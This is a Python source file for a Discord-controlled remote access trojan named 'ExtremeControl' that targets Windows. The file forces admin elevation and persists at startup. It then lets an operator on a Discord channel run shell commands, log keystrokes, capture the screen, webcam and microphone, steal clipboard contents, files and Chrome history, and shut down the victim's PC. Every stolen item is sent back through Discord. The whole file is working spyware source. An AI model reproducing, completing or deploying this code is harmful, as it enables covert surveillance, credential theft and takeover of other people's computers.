__version__ = "1.0.0"   # <-- এই লাইনটা ফাইলের শুরুতে বসাও

import ctypes
import sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

import startup  # 🆕 Auto startup module
startup.add_to_startup()  # 🆕 Enable auto startup

import webbrowser
from core import system
from core import browser
import random
import requests
import discord
from discord.ext import commands
import os
import io
import socket
import config
from core import system, shell, screen, webcam, clipboard, keylogger, voice, windows, file_transfer
from utils.helpers import send_message_to_webhook

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

CLIENT_ID = config.CLIENT_ID
if CLIENT_ID == "YOUR_CLIENT_ID_STRING" or not CLIENT_ID:
    CLIENT_ID = socket.gethostname()

PC_NAME = system.get_sysinfo().get("PC Name", "Unknown")

# Notify webhook that client is online
send_message_to_webhook(config.WEBHOOK_URL, f"✅ `{CLIENT_ID}` ({PC_NAME}) is now ONLINE and ready for control.")

def client_only():
    """Decorator to restrict commands to only when second arg matches CLIENT_ID."""
    def predicate(ctx):
        content = ctx.message.content.strip().split()
        if len(content) < 2:
            return False
        return content[1].strip() == CLIENT_ID
    return commands.check(predicate)

@bot.event
async def on_ready():
    print(f"[+] Client logged in as {bot.user} ✅")
    try:
        channel = bot.get_channel(config.DISCORD_CHANNEL_ID)
        if not channel:
            channel = await bot.fetch_channel(config.DISCORD_CHANNEL_ID)
        await channel.send(f"ExtremeControl Client `{CLIENT_ID}` is Online! Awaiting commands...")
    except Exception as e:
        print(f"[-] Failed to send startup message: {e}")

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    if message.channel.id != config.DISCORD_CHANNEL_ID:
        return
    await bot.process_commands(message)

@bot.command()
async def help(ctx):
    help_text = """
Available commands:
!sysinfo <client_id> - Get system info
!shell <client_id> <command> - Execute shell command
!screenshot <client_id> - Take screenshot
!admincheck <client_id> - Check admin rights
!message <client_id> <text> - Show message box
!webcampic <client_id> - Take webcam picture
!clipboard <client_id> - Get clipboard text
!startkeylogger <client_id> - Start keylogger
!stopkeylogger <client_id> - Stop keylogger
!dumpkeylogger <client_id> - Dump keylogger logs
!voice <client_id> <text> - Speak text
!windowstart <client_id> - Start window tracking
!windowstop <client_id> - Stop window tracking
!filedownload <client_id> <path> - Download file
!changewallpaper <client_id> <url> - Change wallpaper
!voicerecord <client_id> start|stop - Voice record start/stop
!filewrite <client_id> <path> <content> - Write to file
!fileread <client_id> <path> - Read file
!processlist <client_id> - List running processes
!processkill <client_id> <pid> - Kill process by PID
!desktopfiles <client_id> - List Desktop files/folders
!downloadsfiles <client_id> - List Downloads folder contents
!drivecfiles <client_id> - List C:\\ root files/folders
!searchfile <client_id> <filename> - Search file by name in C:\\
!openurl <client_id> <url> - Open URL in browser
!shutdown <client_id> - Shutdown PC
!restart <client_id> - Restart PC
!getlocation <client_id> - Get public IP + location
!speakrandom <client_id> - Speak funny sentence
!browsinghistory <client_id> - Fetch Chrome browsing history
"""
    await ctx.send(f"```{help_text}```")

@bot.command()
@client_only()
async def sysinfo(ctx, client_id):
    info = system.get_sysinfo()
    msg = "\n".join(f"{k}: {v}" for k, v in info.items())
    await ctx.send(f"```{msg}```")

@bot.command()
@client_only()
async def shell(ctx, client_id, *, command):
    try:
        output = shell.execute_shell_command(command)
    except Exception as e:
        output = f"Error executing shell command: {e}"
    if len(output) > 1900:
        output = output[:1900] + "\n...[output truncated]"
    await ctx.send(f"```{output}```")

@bot.command()
@client_only()
async def screenshot(ctx, client_id):
    img_bytes = screen.take_screenshot()
    if img_bytes:
        img_bytes.seek(0)
        await ctx.send(file=discord.File(fp=img_bytes, filename="screenshot.png"))
    else:
        await ctx.send("Failed to take screenshot.")

@bot.command()
@client_only()
async def admincheck(ctx, client_id):
    admin = system.is_admin()
    await ctx.send(f"Admin privileges: {'Yes' if admin else 'No'}")

@bot.command()
@client_only()
async def message(ctx, client_id, *, text):
    system.show_message_box(text)
    await ctx.send(f"Message shown: {text}")

@bot.command()
@client_only()
async def webcampic(ctx, client_id):
    pic_bytes = webcam.take_picture()
    if pic_bytes:
        pic_bytes.seek(0)
        await ctx.send(file=discord.File(fp=pic_bytes, filename="webcam.png"))
    else:
        await ctx.send("Failed to take webcam picture.")

@bot.command()
@client_only()
async def clipboard(ctx, client_id):
    text = clipboard.get_clipboard_text()
    if not text:
        text = "(Clipboard empty)"
    await ctx.send(f"```{text}```")

@bot.command()
@client_only()
async def startkeylogger(ctx, client_id):
    keylogger.start_logger()
    await ctx.send("Keylogger started ✅")

@bot.command()
@client_only()
async def stopkeylogger(ctx, client_id):
    keylogger.stop_logger()
    await ctx.send("Keylogger stopped ✅")

@bot.command()
@client_only()
async def dumpkeylogger(ctx, client_id):
    logs = keylogger.dump_logs()
    if len(logs) > 1900:
        logs = logs[:1900] + "\n...[truncated]"
    await ctx.send(f"```{logs}```")

@bot.command()
@client_only()
async def voice(ctx, client_id, *, text):
    voice.speak(text)
    await ctx.send("Voice executed 🎷")

@bot.command()
@client_only()
async def windowstart(ctx, client_id):
    windows.start_tracking()
    await ctx.send("Started window tracking 🪟")

@bot.command()
@client_only()
async def windowstop(ctx, client_id):
    windows.stop_tracking()
    await ctx.send("Stopped window tracking 🪟")

@bot.command()
@client_only()
async def filedownload(ctx, client_id, *, path):
    data = file_transfer.read_file_bytes(path)
    if data is None:
        await ctx.send(f"Error: Could not read file `{path}`")
    else:
        await ctx.send(file=discord.File(fp=io.BytesIO(data), filename=os.path.basename(path)))

@bot.command()
@client_only()
async def changewallpaper(ctx, client_id, *, url):
    try:
        result = windows.change_wallpaper(url)
    except Exception as e:
        result = f"Error changing wallpaper: {e}"
    await ctx.send(result)

@bot.command()
@client_only()
async def voicerecord(ctx, client_id, action):
    action = action.strip().lower()
    if action == "start":
        result = voice.start_recording()
        await ctx.send(result)
    elif action == "stop":
        file_path = voice.stop_recording()
        if file_path and os.path.exists(file_path):
            await ctx.send(file=discord.File(file_path, filename="voice_record.wav"))
        else:
            await ctx.send("Error stopping recording or file not found.")
    else:
        await ctx.send("Usage: !voicerecord <client_id> start|stop")

@bot.command()
@client_only()
async def filewrite(ctx, client_id, path, *, content):
    try:
        result = windows.write_file(path, content)
    except Exception as e:
        result = f"Error writing file: {e}"
    await ctx.send(result)

@bot.command()
@client_only()
async def fileread(ctx, client_id, *, path):
    try:
        result = windows.read_file(path)
    except Exception as e:
        result = f"Error reading file: {e}"
    if len(result) > 1900:
        result = result[:1900] + "\n...[truncated]"
    await ctx.send(f"```{result}```")

@bot.command()
@client_only()
async def processlist(ctx, client_id):
    try:
        result = windows.list_processes()
    except Exception as e:
        result = f"Error listing processes: {e}"
    if len(result) > 1900:
        result = result[:1900] + "\n...[truncated]"
    await ctx.send(f"```{result}```")

@bot.command()
@client_only()
async def processkill(ctx, client_id, pid):
    try:
        result = windows.kill_process(pid)
    except Exception as e:
        result = f"Error killing process: {e}"
    await ctx.send(result)

@bot.command()
@client_only()
async def desktopfiles(ctx, client_id):
    try:
        result = file_transfer.list_desktop_files_folders()
    except Exception as e:
        result = f"Error listing Desktop files/folders: {e}"
    await ctx.send(f"```{result}```")

@bot.command()
@client_only()
async def downloadsfiles(ctx, client_id):
    try:
        result = file_transfer.list_downloads_files_folders()
    except Exception as e:
        result = f"Error listing Downloads folder contents: {e}"
    await ctx.send(f"```{result}```")

@bot.command()
@client_only()
async def drivecfiles(ctx, client_id):
    try:
        result = file_transfer.list_drive_c()
    except Exception as e:
        result = f"Error listing C:\\ root files/folders: {e}"
    await ctx.send(f"```{result}```")

@bot.command()
@client_only()
async def searchfile(ctx, client_id, *, filename):
    try:
        result = file_transfer.search_file(filename)
    except Exception as e:
        result = f"Error searching for file: {e}"
    if result:
        await ctx.send(f"```{result}```")
    else:
        await ctx.send("File not found.")

@bot.command()
@client_only()
async def browsinghistory(ctx, client_id):
    try:
        history_text = browser.get_chrome_history()
        if not history_text:
            await ctx.send("No browsing history found.")
            return
        if len(history_text) > 1900:
            history_text = history_text[:1900] + "\n...[truncated]"
        await ctx.send(f"```{history_text}```")
    except Exception as e:
        await ctx.send(f"Error fetching browsing history: {e}")

@bot.command()
@client_only()
async def speakrandom(ctx, client_id):
    funny_sentences = [
        "Why don’t scientists trust atoms? Because they make up everything!",
        "I told my computer I needed a break, and it said ‘No problem, I’ll go to sleep.’",
        "Why did the scarecrow win an award? Because he was outstanding in his field!",
        "I would tell you a UDP joke, but you might not get it.",
        "Why do programmers prefer dark mode? Because light attracts bugs!",
        "Why was the math book sad? Because it had too many problems."
    ]
    sentence = random.choice(funny_sentences)
    voice.speak(sentence)
    await ctx.send(f"🎤 Spoke a funny sentence: {sentence}")

@bot.command()
@client_only()
async def getlocation(ctx, client_id):
    try:
        response = requests.get("https://ipinfo.io/json", timeout=10)
        data = response.json()
        ip = data.get("ip", "N/A")
        city = data.get("city", "N/A")
        region = data.get("region", "N/A")
        country = data.get("country", "N/A")
        loc = data.get("loc", "N/A")
        org = data.get("org", "N/A")

        msg = (f"IP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}\n"
               f"Location (lat,long): {loc}\nOrganization: {org}")
        await ctx.send(f"```{msg}```")
    except Exception as e:
        await ctx.send(f"Error fetching location info: {e}")

@bot.command()
@client_only()
async def shutdown(ctx, client_id):
    try:
        await ctx.send("Shutdown command executed. PC will shut down shortly.")
        system.shutdown()
    except Exception as e:
        await ctx.send(f"Failed to shutdown: {e}")

@bot.command()
@client_only()
async def restart(ctx, client_id):
    try:
        await ctx.send("Restart command executed. PC will restart shortly.")
        system.restart()
    except Exception as e:
        await ctx.send(f"Failed to restart: {e}")

@bot.command()
@client_only()
async def openurl(ctx, client_id, *, url):
    try:
        webbrowser.open(url)
        await ctx.send(f"✅ Opened URL: {url}")
    except Exception as e:
        await ctx.send(f"❌ Failed to open URL: {e}")

if __name__ == "__main__":
    print("[*] Starting ExtremeControl client bot...")
    bot.run(config.DISCORD_BOT_TOKEN)
